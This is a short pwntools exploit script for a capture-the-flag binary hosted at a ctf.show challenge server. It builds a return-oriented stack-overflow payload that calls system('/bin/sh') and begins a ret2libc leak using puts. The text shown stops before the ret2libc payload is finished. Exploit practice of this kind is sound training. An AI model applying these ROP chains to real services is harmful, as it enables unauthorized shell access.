from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28198)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
###   ALSR = 0 ####
'''
ret = 0x80483ba # 0x080483ba : ret 
system = 0x7ffff7a31420
binsh = 0x7ffff7b95d88
pop_rdi = 0x4007a3  # 0x00000000004007a3 : pop rdi ; ret
ret = 0x4004c6  # 0x00000000004004c6 : ret 
payload = cyclic(0x40+8) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
io.send(payload)
io.recv()
io.interactive()
'''
### ret2libc ###
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x4007a3 # 0x00000000004007a3 : pop rdi ; ret
ret = 0x4004c6     # 0x00000000004004c6 : ret
